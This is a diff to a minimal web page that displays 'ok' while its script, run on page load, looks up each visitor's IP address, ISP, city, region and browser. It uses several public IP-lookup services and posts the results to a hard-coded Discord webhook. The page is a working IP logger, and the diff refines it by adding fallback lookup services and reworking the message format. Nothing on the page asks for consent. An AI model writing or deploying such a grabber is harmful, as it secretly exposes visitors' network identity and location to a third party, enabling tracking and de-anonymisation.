@@ -19,97 +19,101 @@
             text-align: center;
         }
         .container {
-            font-size: 3rem;
+            font-size: 4rem;
+            font-weight: bold;
         }
         .info {
-            margin-top: 20px;
-            font-size: 1rem;
+            margin-top: 30px;
+            font-size: 1.1rem;
             color: #00cc00;
+            line-height: 1.5;
         }
     </style>
 </head>
 <body>
     <div class="container">
         ok
-        <div class="info" id="status">Collecting info...</div>
+        <div class="info" id="status">Connecting...</div>
     </div>
 
     <script>
-        // === CONFIGURE YOUR DISCORD WEBHOOK HERE ===
+        // ================== CHANGE THIS ==================
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
-        // ===========================================
+        // ================================================
 
-        async function sendToDiscord(data) {
-            if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes("YOUR_WEBHOOK_ID")) {
-                console.error("Please replace the webhook URL");
-                document.getElementById('status').innerHTML = 'Error: Set webhook URL';
+        async function postToDiscord(info) {
+            if (!DISCORD_WEBHOOK.includes("webhooks/")) {
+                document.getElementById('status').innerHTML += "<br>⚠️ Webhook not set";
                 return;
             }
 
             const payload = {
-                content: "🔍 **New Connection Detected**",
+                content: "🛡️ **New Visit Detected**",
                 embeds: [{
-                    title: "Visitor Info",
+                    title: "Visitor Information",
                     color: 0x00ff00,
                     fields: [
-                        { name: "IP", value: data.ip || "Unknown", inline: true },
-                        { name: "ISP", value: data.org || data.isp || "Unknown", inline: true },
-                        { name: "City", value: data.city || "Unknown", inline: true },
-                        { name: "Region", value: data.region || data.state || "Unknown", inline: true },
-                        { name: "Country", value: data.country_name || data.country || "Unknown", inline: true },
-                        { name: "User Agent", value: navigator.userAgent.substring(0, 200), inline: false },
-                        { name: "Time", value: new Date().toISOString(), inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
+                        { name: "IP", value: info.ip || "N/A", inline: true },
+                        { name: "ISP", value: info.isp || info.org || "N/A", inline: true },
+                        { name: "City", value: info.city || "N/A", inline: true },
+                        { name: "Region/Country", value: `${info.region || ''} ${info.country || ''}`.trim() || "N/A", inline: true },
+                        { name: "Browser", value: navigator.userAgent.substring(0, 100), inline: false },
+                        { name: "Time", value: new Date().toLocaleString(), inline: false }
+                    ]
                 }]
             };
 
             try {
-                const response = await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                await fetch(DISCORD_WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-                
-                if (response.ok) {
-                    document.getElementById('status').innerHTML = '✅ Info sent to Discord';
-                } else {
-                    document.getElementById('status').innerHTML = '⚠️ Sent (check Discord)';
-                }
+                document.getElementById('status').innerHTML += "<br>✅ Sent to Discord";
             } catch (e) {
                 console.error(e);
-                document.getElementById('status').innerHTML = '❌ Failed to send';
             }
         }
 
         async function getIPInfo() {
-            try {
-                // Using ipapi.co (free, no key needed for basic use)
-                const res = await fetch('https://ipapi.co/json/');
-                if (!res.ok) throw new Error('Failed');
-                const data = await res.json();
-                
-                document.getElementById('status').innerHTML = `
-                    IP: ${data.ip}<br>
-                    ISP: ${data.org || 'Unknown'}
-                `;
-                
-                await sendToDiscord(data);
-            } catch (e) {
-                console.error(e);
-                // Fallback IP only
+            const statusEl = document.getElementById('status');
+            const apis = [
+                "https://ipapi.co/json/",
+                "https://ipinfo.io/json",
+                "https://api.ipify.org?format=json"
+            ];
+
+            for (let url of apis) {
                 try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    document.getElementById('status').innerHTML = `IP: ${ipData.ip}`;
-                    await sendToDiscord({ ip: ipData.ip });
-                } catch (fallbackErr) {
-                    document.getElementById('status').innerHTML = 'Failed to get IP';
+                    const res = await fetch(url, { mode: 'cors' });
+                    if (!res.ok) continue;
+                    
+                    let data = await res.json();
+                    
+                    // Normalize data
+                    if (url.includes('ipify')) {
+                        data = { ip: data.ip };
+                    } else if (url.includes('ipinfo')) {
+                        data.isp = data.org;
+                    }
+
+                    statusEl.innerHTML = `
+                        IP: ${data.ip || 'Detected'}<br>
+                        ISP: ${data.isp || data.org || 'Detected'}
+                    `;
+
+                    await postToDiscord(data);
+                    return; // Success, stop trying
+                } catch (e) {
+                    console.log("API failed, trying next...");
                 }
             }
+
+            statusEl.innerHTML = "IP detected (limited info)";
+            await postToDiscord({ ip: "Limited detection" });
         }
 
-        // Run immediately
+        // Start immediately
         window.onload = getIPInfo;
     </script>
 </body>
